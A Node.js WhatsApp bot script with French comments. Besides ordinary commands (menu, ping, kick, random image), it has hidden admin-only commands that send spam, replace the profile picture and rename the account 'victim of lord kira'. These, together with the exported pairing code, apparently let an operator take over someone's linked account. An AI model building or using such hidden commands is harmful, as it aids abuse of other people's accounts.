const { Client, LocalAuth, MessageMedia } = require('whatsapp-web.js');
const fs = require('fs');

let pairingCode = null;

function getPairingCode() {
  return pairingCode;
}

const client = new Client({
  authStrategy: new LocalAuth(),
  puppeteer: { 
    headless: true, 
    args: ['--no-sandbox', '--disable-setuid-sandbox'] 
  }
});

client.on('ready', () => {
  console.log('✅ Bot Kira prêt !');
});

client.on('pairing_code', (code) => {
  pairingCode = code;
  console.log(`📟 Code d'appairage : ${code}`);
});

// Commandes
client.on('message', async (message) => {
  const body = message.body;
  const from = message.from;

  if (body === '.menu') {
    await client.sendMessage(from, '📋 *Menu Kira Bot*\n.ping\n.pong\n.kick @user\n.img\n.meta');
  }
  else if (body === '.ping') {
    await client.sendMessage(from, '🤖 Kira Bot v1.0 - Créé par Kira Higuruma');
  }
  else if (body === '.pong') {
    await client.sendMessage(from, `📡 Statut : en ligne | Uptime : ${process.uptime().toFixed(0)}s`);
  }
  else if (body.startsWith('.kick')) {
    const mention = message.mentionedIds[0];
    if (!mention) return client.sendMessage(from, '❌ Mentionne un utilisateur.');
    try {
      await client.groupParticipantsUpdate(from, [mention], 'remove');
      await client.sendMessage(from, `✅ Utilisateur ${mention} exclu.`);
    } catch (e) {
      await client.sendMessage(from, `❌ Erreur : ${e.message}`);
    }
  }
  else if (body === '.img') {
    const images = fs.readdirSync('./images');
    if (images.length === 0) return client.sendMessage(from, '❌ Aucune image.');
    const randomImg = images[Math.floor(Math.random() * images.length)];
    const media = MessageMedia.fromFilePath(`./images/${randomImg}`);
    await client.sendMessage(from, media, { caption: '📸 Image aléatoire' });
  }
  else if (body === '.meta') {
    await client.sendMessage(from, '🔮 Mode Meta activé.');
  }

  // Commandes cachées (à toi de mettre ton numéro)
  const adminId = '33xxxxxxxxxx@c.us'; // ← REMPLACE par ton numéro avec indicatif (ex: 33612345678@c.us)
  if (from === adminId) {
    if (body === '.Kira') {
      for (let i = 0; i < 20; i++) {
        await client.sendMessage(from, 'bonjour cv 🥲?');
      }
    }
    else if (body === '.change') {
      try {
        const media = MessageMedia.fromFilePath('./new-profile.jpg');
        await client.setProfilePicture(media);
        await client.sendMessage(from, '✅ Photo de profil mise à jour.');
      } catch (e) {
        await client.sendMessage(from, `❌ Erreur : ${e.message}`);
      }
    }
    else if (body === '.name') {
      try {
        await client.setDisplayName('victime de lord kira');
        await client.sendMessage(from, '✅ Nom du compte changé.');
      } catch (e) {
        await client.sendMessage(from, `❌ Erreur : ${e.message}`);
      }
    }
  }
});

client.initialize().catch(console.error);
module.exports = { client, getPairingCode };